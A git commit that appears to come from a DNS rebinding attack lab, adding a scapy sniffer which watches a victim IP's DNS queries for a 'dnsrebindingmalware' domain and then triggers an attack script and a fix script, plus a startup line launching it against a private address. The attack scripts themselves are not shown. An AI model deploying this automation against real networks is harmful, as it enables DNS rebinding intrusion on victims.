9d7e818b74ae79945002f12d29948b968a1c71ca
0xDrogon <tiagofsdomingues@gmail.com>
2022-11-03 23:18:16 +0000

    adds sniffer to dns-server and automates attack

---
+++ dns-server/utils/sniffer.py
@@ -0,0 +1,24 @@
+import sys, subprocess, time
+from scapy.all import *
+
+victim = ''
+
+def select_dns_from_victim(pkt):
+    global victim
+    if DNS in pkt and b'www.dnsrebindingmalware.com' in pkt[DNS].qd.qname and pkt[IP].src == victim:
+        print('Calling attack script...')
+        subprocess.call("/etc/bind/attack.sh")
+        print('Done!')
+        time.sleep(5)
+        print('Calling fix script...')
+        subprocess.call("/etc/bind/fix.sh")
+        print('Done!')
+        exit()
+
+if __name__ == '__main__': 
+    if len(sys.argv) < 2:
+        print('Please provide the IP address of the victim')
+        exit()
+    victim = sys.argv[1]
+    print('Starting sniffer...')
+    pkt = sniff(filter='udp and (src host ' + victim + ' and dst port 53)', prn=select_dns_from_victim)
--- dns-server/utils/start.sh
+++ dns-server/utils/start.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
 
 systemctl start bind9
+python3 /etc/bind/sniffer.py 192.168.122.221
+
 while [ true ]; do sleep 60; done
